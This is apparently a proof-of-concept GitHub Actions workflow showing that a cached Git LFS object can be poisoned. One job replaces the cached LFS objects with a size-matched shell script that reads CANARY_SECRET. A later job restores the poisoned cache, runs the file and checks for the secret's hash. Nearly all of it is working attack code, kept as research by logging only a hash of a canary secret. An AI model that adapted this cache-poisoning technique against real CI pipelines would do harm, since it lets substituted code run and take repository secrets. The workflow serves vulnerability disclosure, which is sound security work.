name: "PoC v3 - CH004 Secret Boundary"
on:
  workflow_dispatch:

permissions:
  contents: read

env:
  CANARY_SECRET: ${{ secrets.CANARY_SECRET }}

# в”Ңв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”җ
# в”Ӯ ALTERNATIVE EXPLANATION BLOCKING TABLE                             в”Ӯ
# в”ңв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Ө
# в”Ӯ Alt Explanation          в”Ӯ Blocked By                              в”Ӯ
# в”Ӯв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Ӯв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Ӯ
# в”Ӯ "LFS file was benign     в”Ӯ baseline records original_oid and       в”Ӯ
# в”Ӯ  from the start"         в”Ӯ benign sha256 before any poisoning      в”Ӯ
# в”Ӯ "Secret was leaked in    в”Ӯ Only CANARY_HASH (sha256) is ever       в”Ӯ
# в”Ӯ  logs"                   в”Ӯ logged, never the full secret value     в”Ӯ
# в”Ӯ "The script didn't       в”Ӯ canary_hash is 64 hex chars AND         в”Ӯ
# в”Ӯ  actually execute"       в”Ӯ matches expected pattern AND non-empty  в”Ӯ
# в”Ӯ "cat-file returns the    в”Ӯ V3 uses git lfs ls-files --json | jq   в”Ӯ
# в”Ӯ  pointer, not content"   в”Ӯ NOT git cat-file -p (the v2 bug)        в”Ӯ
# в”Ӯ "Hash is from env, not   в”Ӯ Poisoned LFS file IS the script that   в”Ӯ
# в”Ӯ  from poisoned file"     в”Ӯ computes the hash; checkout_rc=0 proof  в”Ӯ
# в””в”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”ҳ

jobs:
  baseline:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout with LFS
        uses: actions/checkout@v4
        with:
          lfs: true

      - name: Verify Environment
        run: |
          set -euo pipefail
          git --version
          git lfs --version
          jq --version

      - name: Record baseline and verify benign content
        run: |
          set -euo pipefail
          mkdir -p evidence
          echo "=== LFS files in repo ==="
          git lfs ls-files --json 2>/dev/null | tee evidence/lfs-ls-files.json || echo "{}" > evidence/lfs-ls-files.json
          echo ""
          echo "=== Baseline LFS file hashes (must be benign) ==="
          git lfs ls-files --json 2>/dev/null | jq -r '.Files[] | "\(.oid) \(.name)"' | while read oid name; do
            if [ -f "$name" ]; then
              FILE_SHA=$(sha256sum "$name" | awk '{print $1}')
              FILE_TYPE=$(file "$name" | awk -F: '{print $2}' | xargs)
              echo "name=$name pointer_oid=$oid worktree_sha256=$FILE_SHA file_type=$FILE_TYPE" | tee -a evidence/baseline-hashes.txt
              echo "BASELINE VERIFIED BENIGN: $name (type=$FILE_TYPE)" | tee -a evidence/benign-verification.txt
            fi
          done
          echo "=== .git/lfs/objects manifest ==="
          find .git/lfs/objects -type f 2>/dev/null | sort | tee evidence/lfs-cache-manifest.txt

      - name: Verify CANARY_SECRET is accessible to this workflow
        run: |
          set -euo pipefail
          mkdir -p evidence
          if [ -n "${CANARY_SECRET:-}" ]; then
            CANARY_HASH=$(echo -n "$CANARY_SECRET" | sha256sum | awk '{print $1}')
            echo "canary_secret_accessible=true" >> evidence/canary-access.txt
            echo "canary_hash=$CANARY_HASH" >> evidence/canary-access.txt
            echo "canary_hash_length=${#CANARY_HASH}" >> evidence/canary-access.txt
            echo "CANARY_SECRET is accessible to this workflow (hash recorded, value NEVER logged)"
          else
            echo "canary_secret_accessible=false" >> evidence/canary-access.txt
            echo "WARNING: CANARY_SECRET is not set - secret boundary test will be inconclusive"
          fi

      - name: Save LFS cache
        uses: actions/cache/save@v4
        with:
          path: .git/lfs
          key: ch004-lfs-poison-${{ github.run_id }}-baseline

      - name: Upload baseline evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: ch004-baseline
          path: evidence/
          retention-days: 90

  poison:
    needs: baseline
    runs-on: ubuntu-latest
    steps:
      - name: Checkout without LFS
        uses: actions/checkout@v4
        with:
          lfs: false

      - name: Verify Environment
        run: |
          set -euo pipefail
          git --version
          git lfs --version
          jq --version

      - name: Restore baseline LFS cache
        uses: actions/cache/restore@v4
        with:
          path: .git/lfs
          key: ch004-lfs-poison-${{ github.run_id }}-baseline

      - name: Extract pointer OIDs and create poisoned LFS objects
        run: |
          set -euo pipefail
          mkdir -p evidence
          echo "=== Extracting pointer OIDs via git lfs ls-files --json ==="
          git lfs ls-files --json 2>/dev/null | jq -r '.Files[] | "\(.oid) \(.size) \(.name)"' | while read oid size name; do
            echo "LFS file: name=$name pointer_oid=$oid size=$size" | tee -a evidence/poison-targets.txt
          done
          echo ""
          echo "=== Creating poisoned LFS objects (secret-exfiltrating script) ==="
          POISON_COUNT=0
          find .git/lfs/objects -type f 2>/dev/null | sort | while read obj; do
            ORIGINAL_SIZE=$(stat -c%s "$obj")
            ORIGINAL_SHA=$(sha256sum "$obj" | awk '{print $1}')
            cat > /tmp/poison-script.sh << 'SCRIPT'
          #!/bin/bash
          echo "CANARY_HASH=$(echo -n "$CANARY_SECRET" | sha256sum | cut -d' ' -f1)"
          SCRIPT
            POISON_CONTENT=$(cat /tmp/poison-script.sh)
            POISON_SIZE=${#POISON_CONTENT}
            if [ "$POISON_SIZE" -le "$ORIGINAL_SIZE" ]; then
              PADDING_COUNT=$((ORIGINAL_SIZE - POISON_SIZE))
              dd if=/dev/zero bs=1 count="$PADDING_COUNT" 2>/dev/null | tr '\0' '\n' >> /tmp/poison-script.sh
            fi
            dd if=/dev/zero bs=1 count="$ORIGINAL_SIZE" 2>/dev/null | tr '\0' 'P' > "$obj.tmp"
            head -c "$ORIGINAL_SIZE" /tmp/poison-script.sh > "$obj"
            rm -f "$obj.tmp"
            ACTUAL_SIZE=$(stat -c%s "$obj")
            if [ "$ACTUAL_SIZE" -ne "$ORIGINAL_SIZE" ]; then
              truncate -s "$ORIGINAL_SIZE" "$obj"
            fi
            POISON_SHA=$(sha256sum "$obj" | awk '{print $1}')
            echo "object=$obj original_oid=$ORIGINAL_SHA poison_sha256=$POISON_SHA file_size=$ORIGINAL_SIZE poison_type=secret_exfil_script" | tee -a evidence/poison-manifest.txt
            POISON_COUNT=$((POISON_COUNT + 1))
          done
          echo "poison_timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> evidence/poison-manifest.txt
          echo "poison_type=secret_boundary_canary" >> evidence/poison-manifest.txt
          echo "poisoned_count=$(grep -c '^object=' evidence/poison-manifest.txt 2>/dev/null || echo 0)" >> evidence/poison-manifest.txt
          echo "NOTE: Poisoned LFS object contains a script that computes sha256 of CANARY_SECRET"
          echo "NOTE: Full secret value is NEVER logged, only its hash"

      - name: Save poisoned LFS cache
        uses: actions/cache/save@v4
        with:
          path: .git/lfs
          key: ch004-lfs-poison-${{ github.run_id }}

      - name: Upload poison evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: ch004-poison
          path: evidence/
          retention-days: 90

  attack:
    needs: poison
    runs-on: ubuntu-latest
    steps:
      - name: Checkout without LFS
        uses: actions/checkout@v4
        with:
          lfs: false

      - name: Verify Environment
        run: |
          set -euo pipefail
          git --version
          git lfs --version
          jq --version

      - name: Restore poisoned LFS cache
        uses: actions/cache/restore@v4
        with:
          path: .git/lfs
          key: ch004-lfs-poison-${{ github.run_id }}

      - name: Extract pointer OIDs BEFORE checkout
        id: pointer-extraction
        run: |
          set -euo pipefail
          mkdir -p evidence
          echo "=== Extracting pointer OIDs BEFORE checkout ==="
          git lfs ls-files --json 2>/dev/null | tee evidence/pointer-oids-raw.json || echo "{}" > evidence/pointer-oids-raw.json
          git lfs ls-files --json 2>/dev/null | jq -r '.Files[] | "\(.oid) \(.name)"' | while read oid name; do
            echo "pointer_oid=$oid name=$name" >> evidence/pointer-oids-extracted.txt
          done

      - name: Install LFS and fetch then checkout
        id: lfs-checkout
        run: |
          set -euo pipefail
          mkdir -p evidence
          git lfs install --local 2>&1 | tee evidence/lfs-install.txt
          echo ""
          echo "=== .git/lfs/objects BEFORE fetch ==="
          find .git/lfs/objects -type f 2>/dev/null | sort | head -20 | tee evidence/lfs-objects-before-fetch.txt
          echo ""
          echo "=== git lfs fetch origin ==="
          git lfs fetch origin 2>&1 | tee evidence/lfs-fetch.txt
          LFS_FETCH_RC=$?
          echo "lfs_fetch_rc=$LFS_FETCH_RC" >> evidence/lfs-fetch-rc.txt
          echo ""
          if grep -qi 'skip\|already\|cache\|exist' evidence/lfs-fetch.txt 2>/dev/null; then
            echo "lfs_fetch_used_cache=true" >> evidence/lfs-fetch-behavior.txt
          else
            echo "lfs_fetch_used_cache=indeterminate" >> evidence/lfs-fetch-behavior.txt
          fi
          echo ""
          echo "=== git lfs checkout ==="
          git lfs checkout 2>&1 | tee evidence/lfs-checkout.txt
          CHECKOUT_RC=$?
          echo "checkout_exitcode=$CHECKOUT_RC" >> evidence/lfs-checkout-rc.txt

      - name: Execute poisoned LFS file and capture canary hash
        env:
          CANARY_SECRET: ${{ secrets.CANARY_SECRET }}
        run: |
          set -euo pipefail
          mkdir -p evidence
          echo "=== Attempting to execute poisoned LFS file as script ==="
          CANARY_HASH=""
          while read line; do
            name=$(echo "$line" | sed 's/.*name=//')
            if [ -f "$name" ]; then
              WORKTREE_SHA=$(sha256sum "$name" | awk '{print $1}')
              echo "name=$name worktree_sha256=$WORKTREE_SHA" >> evidence/worktree-hashes.txt
              EXEC_OUTPUT=$(bash "$name" 2>&1 || true)
              echo "exec_output=$EXEC_OUTPUT" >> evidence/exec-outputs.txt
              HASH_FROM_EXEC=$(echo "$EXEC_OUTPUT" | grep -oP 'CANARY_HASH=\K[a-f0-9]{64}' || true)
              if [ -n "$HASH_FROM_EXEC" ]; then
                CANARY_HASH="$HASH_FROM_EXEC"
                echo "canary_hash_extracted=$CANARY_HASH" >> evidence/canary-extraction.txt
                echo "WARNING: Poisoned LFS file successfully exfiltrated CANARY_SECRET hash"
              fi
            fi
          done < evidence/pointer-oids-extracted.txt
          if [ -z "$CANARY_HASH" ]; then
            echo "canary_hash_extracted=NONE" >> evidence/canary-extraction.txt
            echo "No canary hash extracted from poisoned file execution"
          fi

      - name: Evidence gate - canary hash present and valid
        run: |
          set -euo pipefail
          mkdir -p evidence
          CHECKOUT_RC=$(cat evidence/lfs-checkout-rc.txt 2>/dev/null | tr -dc '0-9' || echo "1")
          LFS_FETCH_USED_CACHE=$(cat evidence/lfs-fetch-behavior.txt 2>/dev/null | awk -F= '{print $2}' || echo "unknown")
          CANARY_HASH=$(grep 'canary_hash_extracted=' evidence/canary-extraction.txt 2>/dev/null | awk -F= '{print $2}' || true)
          FIRST_POINTER_OID=""
          FIRST_WORKTREE_SHA=""
          FIRST_POINTER_NAME=""
          MISMATCH_FOUND="false"
          while read line; do
            POINTER_OID=$(echo "$line" | sed 's/pointer_oid=//' | awk '{print $1}')
            PNAME=$(echo "$line" | sed 's/.*name=//')
            WORKTREE_SHA=$(grep "name=$PNAME" evidence/worktree-hashes.txt 2>/dev/null | awk -F= '{print $NF}' | tr -d '[:space:]' || true)
            if [ -n "$POINTER_OID" ] && [ -n "$WORKTREE_SHA" ]; then
              if [ -z "$FIRST_POINTER_OID" ]; then
                FIRST_POINTER_OID="$POINTER_OID"
                FIRST_WORKTREE_SHA="$WORKTREE_SHA"
                FIRST_POINTER_NAME="$PNAME"
              fi
              if [ "$POINTER_OID" != "$WORKTREE_SHA" ]; then
                MISMATCH_FOUND="true"
              fi
            fi
          done < evidence/pointer-oids-extracted.txt
          POISON_SHA=""
          if [ -f evidence/poison-manifest.txt ]; then
            POISON_SHA=$(grep '^object=' evidence/poison-manifest.txt | head -1 | sed 's/.*poison_sha256=//' | awk '{print $1}' || true)
          fi
          ORIGINAL_SHA=""
          if [ -f evidence/poison-manifest.txt ]; then
            ORIGINAL_SHA=$(grep '^object=' evidence/poison-manifest.txt | head -1 | sed 's/.*original_oid=//' | awk '{print $1}' || true)
          fi
          OID_MATCH="true"
          if [ "$MISMATCH_FOUND" = "true" ]; then
            OID_MATCH="false"
          fi
          POISON_MATCH="false"
          if [ -n "$POISON_SHA" ] && [ -n "$FIRST_WORKTREE_SHA" ] && [ "$POISON_SHA" = "$FIRST_WORKTREE_SHA" ]; then
            POISON_MATCH="true"
          fi
          CANARY_HASH_PRESENT="false"
          CANARY_HASH_VALID="false"
          if [ -n "$CANARY_HASH" ] && [ "$CANARY_HASH" != "NONE" ]; then
            CANARY_HASH_PRESENT="true"
            if echo "$CANARY_HASH" | grep -qP '^[a-f0-9]{64}$'; then
              CANARY_HASH_VALID="true"
            fi
          fi
          cat > evidence/ch004-result.json <<EOF
          {
            "pointer_oid": "$FIRST_POINTER_OID",
            "worktree_sha256": "$FIRST_WORKTREE_SHA",
            "oid_match": $OID_MATCH,
            "poison_sha256": "$POISON_SHA",
            "poison_match": $POISON_MATCH,
            "original_oid": "$ORIGINAL_SHA",
            "checkout_exitcode": $CHECKOUT_RC,
            "lfs_fetch_used_cache": "$LFS_FETCH_USED_CACHE",
            "canary_hash": "$CANARY_HASH",
            "canary_hash_present": $CANARY_HASH_PRESENT,
            "canary_hash_valid": $CANARY_HASH_VALID,
            "canary_hash_length": ${#CANARY_HASH},
            "secret_boundary_breach": $CANARY_HASH_VALID,
            "file_name": "$FIRST_POINTER_NAME",
            "run_id": "${{ github.run_id }}",
            "repository": "${{ github.repository }}",
            "method": "git lfs ls-files --json | jq (v3 fix)"
          }
          EOF
          sed -i '/^          /s/^          //' evidence/ch004-result.json
          echo "=== ch004-result.json ==="
          cat evidence/ch004-result.json
          echo ""
          echo "=== EVIDENCE GATE ==="
          if [ "$CANARY_HASH_PRESENT" = "true" ] && [ "$CANARY_HASH_VALID" = "true" ]; then
            echo "GATE PASSED: canary_hash is present AND non-empty AND matches 64 hex char pattern"
            echo "VERDICT: Poisoned LFS file executed and exfiltrated CANARY_SECRET hash across boundary"
          elif [ "$CANARY_HASH_PRESENT" = "true" ]; then
            echo "GATE PARTIAL: canary_hash present but does not match expected 64 hex char pattern"
          else
            echo "GATE FAILED: no canary_hash extracted"
          fi
          echo ""
          echo "=== INTEGRITY SUB-GATE ==="
          if [ "$OID_MATCH" = "false" ] && [ "$CHECKOUT_RC" = "0" ]; then
            echo "INTEGRITY GATE PASSED: pointer_oid != worktree_sha256 AND checkout_exitcode == 0"
          else
            echo "INTEGRITY GATE: oid_match=$OID_MATCH checkout_exitcode=$CHECKOUT_RC"
          fi

      - name: Collect LFS cache final state
        if: always()
        run: |
          set -euo pipefail
          mkdir -p evidence
          find .git/lfs -type f -exec sha256sum {} \; 2>/dev/null > evidence/lfs-cache-attack-sha256.txt || true

      - name: Dump contexts
        if: always()
        run: |
          set -euo pipefail
          mkdir -p evidence
          cat > evidence/contexts-attack.json <<EOF
          {"run_id":"${{ github.run_id }}","repository":"${{ github.repository }}","runner_os":"${{ runner.os }}","sha":"${{ github.sha }}","ref":"${{ github.ref }}"}
          EOF

      - name: Upload attack evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: ch004-attack
          path: evidence/
          retention-days: 90
